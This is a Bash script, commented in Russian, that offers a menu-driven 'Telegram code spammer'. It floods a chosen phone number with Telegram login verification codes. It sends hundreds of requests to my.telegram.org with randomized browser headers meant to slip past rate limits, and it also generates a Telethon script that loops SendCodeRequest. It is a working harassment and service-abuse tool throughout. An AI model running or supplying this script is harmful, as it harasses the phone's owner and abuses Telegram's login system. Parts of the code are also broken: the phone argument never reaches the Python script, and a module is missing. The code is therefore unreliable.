#!/bin/bash
# tg_code_spam.sh - Спам кодами подтверждения Telegram (мой.телеграм.орг + API)

# Цвета
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

CONFIG="$HOME/.tg_spam_config"
LAST_NUMBER=""
[[ -f "$CONFIG" ]] && LAST_NUMBER=$(cat "$CONFIG")

# ---- Функции ----
clear_screen() { clear; }

show_menu() {
    clear_screen
    echo -e "${CYAN}╔══════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}║   TELEGRAM CODE SPAMMER v3.0        ║${RESET}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${RESET}"
    echo ""
    echo -e "${WHITE}1) Установить номер цели${RESET}"
    echo -e "${WHITE}2) Спам кодами через сайт (my.telegram.org)${RESET}"
    echo -e "${WHITE}3) Спам кодами через API (Telethon)${RESET}"
    echo -e "${WHITE}4) Комбинированный спам (сайт + API)${RESET}"
    echo -e "${WHITE}5) Остановить атаку${RESET}"
    echo -e "${WHITE}6) Показать текущий номер${RESET}"
    echo -e "${RED}7) Выход${RESET}"
    echo ""
    echo -e "${YELLOW}Текущий номер: ${GREEN}${LAST_NUMBER:-Не установлен}${RESET}"
    echo ""
    echo -n "Выберите опцию: "
}

set_number() {
    clear_screen
    echo -e "${CYAN}══════ УСТАНОВКА НОМЕРА ══════${RESET}"
    echo ""
    read -p "Номер (+79991234567): " input_number
    input_number=$(echo "$input_number" | tr -d ' ' | tr -d '-' | tr -d '(' | tr -d ')')
    [[ ! "$input_number" =~ ^\+ ]] && input_number="+$input_number"
    echo "$input_number" > "$CONFIG"
    LAST_NUMBER="$input_number"
    echo -e "${GREEN}✓ Номер установлен: $input_number${RESET}"
    sleep 1
}

# ---- СПАМ ЧЕРЕЗ САЙТ my.telegram.org ----
spam_via_site() {
    local target="$1"
    local count=0
    echo -e "${YELLOW}Запуск спама через сайт...${RESET}"
    
    for i in {1..500}; do
        # Случайные заголовки
        UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1$((RANDOM%9)).0.0.0 Safari/537.36"
        PHONE_PARAM="phone=$target&_=$(date +%s%N | cut -b1-13)$RANDOM"
        
        curl -s -X POST "https://my.telegram.org/auth/send_code" \
            -H "User-Agent: $UA" \
            -H "Accept: application/json, text/plain, */*" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Origin: https://my.telegram.org" \
            -H "Referer: https://my.telegram.org/auth" \
            -d "$PHONE_PARAM" \
            --max-time 5 \
            -o /dev/null \
            -w "%{http_code}\n" \
            2>/dev/null &
        
        sleep $((RANDOM % 2 + 1))
        ((count++))
        if (( count % 50 == 0 )); then
            echo -e "${CYAN}Отправлено $count запросов через сайт...${RESET}"
        fi
        
        [[ -f "/tmp/stop_attack" ]] && { rm -f /tmp/stop_attack; echo -e "${RED}Остановлено.${RESET}"; break; }
    done
    wait
}

# ---- СПАМ ЧЕРЕЗ API (TELEGRAM) ----
spam_via_api() {
    local target="$1"
    echo -e "${YELLOW}Запуск спама через API...${RESET}"
    
    # Создаём временный Python-скрипт
    cat > /tmp/tg_api_spam.py << 'EOF'
import asyncio
from telethon import TelegramClient, functions

API_ID = 1234567
API_HASH = 'your_api_hash_here'

async def spam_code(target_phone):
    client = TelegramClient('temp_session', API_ID, API_HASH)
    await client.start()
    
    for i in range(100):
        try:
            # Запрос на отправку кода (имитация входа)
            await client(functions.auth.SendCodeRequest(
                phone_number=target_phone,
                settings=types.CodeSettings(
                    allow_flashcall=False,
                    current_number=True,
                    allow_app_hash=False
                )
            ))
            print(f"[API] Запрос #{i+1} отправлен")
        except Exception as e:
            print(f"[API] Ошибка: {e}")
        await asyncio.sleep(0.5)
    
    await client.disconnect()

asyncio.run(spam_code('$1'))
EOF

    # Запускаем скрипт (если telethon установлен)
    if command -v python &>/dev/null; then
        python /tmp/tg_api_spam.py &
        sleep 2
    else
        echo -e "${RED}Python не установлен! Установите: pkg install python${RESET}"
    fi
}

# ---- КОМБИНИРОВАННЫЙ СПАМ ----
spam_combined() {
    [[ -z "$LAST_NUMBER" ]] && { echo -e "${RED}Сначала установите номер!${RESET}"; sleep 2; return; }
    clear_screen
    echo -e "${RED}══════ КОМБИНИРОВАННЫЙ СПАМ ══════${RESET}"
    echo -e "${YELLOW}Цель: ${GREEN}$LAST_NUMBER${RESET}"
    echo -e "${YELLOW}Методы: сайт my.telegram.org + API${RESET}"
    echo -e "${RED}Для остановки нажмите Ctrl+C${RESET}"
    echo ""
    sleep 2
    
    # Запускаем оба метода параллельно
    spam_via_site "$LAST_NUMBER" &
    PID_SITE=$!
    
    # Проверяем наличие Telethon для API-спама
    if pip list 2>/dev/null | grep -q telethon; then
        spam_via_api "$LAST_NUMBER" &
        PID_API=$!
    else
        echo -e "${YELLOW}Telethon не установлен. API-спам пропущен.${RESET}"
        echo -e "${YELLOW}Установите: pip install telethon${RESET}"
    fi
    
    # Ожидаем завершения
    wait 2>/dev/null
    echo -e "${GREEN}Атака завершена.${RESET}"
    sleep 2
}

# ---- ОСТАНОВКА ----
stop_attack() {
    touch /tmp/stop_attack
    pkill -f "tg_code_spam.sh" 2>/dev/null
    pkill -f "curl" 2>/dev/null
    pkill -f "python.*tg_api_spam" 2>/dev/null
    rm -f /tmp/tg_api_spam.py
    echo -e "${GREEN}Остановлено.${RESET}"
    sleep 1
}

# ---- MAIN ----
while true; do
    show_menu
    read choice
    case $choice in
        1) set_number ;;
        2) [[ -z "$LAST_NUMBER" ]] && { echo "Установите номер!"; sleep 1; } || spam_via_site "$LAST_NUMBER" ;;
        3) [[ -z "$LAST_NUMBER" ]] && { echo "Установите номер!"; sleep 1; } || spam_via_api "$LAST_NUMBER" ;;
        4) spam_combined ;;
        5) stop_attack ;;
        6) clear_screen; echo -e "${CYAN}Номер: ${GREEN}${LAST_NUMBER:-Не установлен}${RESET}"; sleep 1 ;;
        7) clear_screen; echo -e "${RED}Выход...${RESET}"; exit 0 ;;
        *) echo -e "${RED}Неверный выбор.${RESET}"; sleep 1 ;;
    esac
done
